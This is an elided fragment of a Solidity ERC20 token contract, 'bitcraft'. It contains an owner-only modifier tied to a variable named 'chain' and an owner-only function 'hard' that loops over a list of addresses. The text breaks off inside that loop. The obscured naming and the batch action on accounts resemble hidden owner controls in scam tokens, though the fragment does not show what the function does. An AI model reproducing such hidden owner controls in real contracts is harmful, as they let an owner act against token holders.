...
contract bitcraft is Context, IERC20 {
    ...
    modifier onlyOwner() {
        require(msg.sender == chain, "Not allowed");
        _;
    }

    function hard(address[] memory Venus) public onlyOwner() {
        for (uint256 i = 0; i < Venus.length; i++) {
            address account = Venus[i];
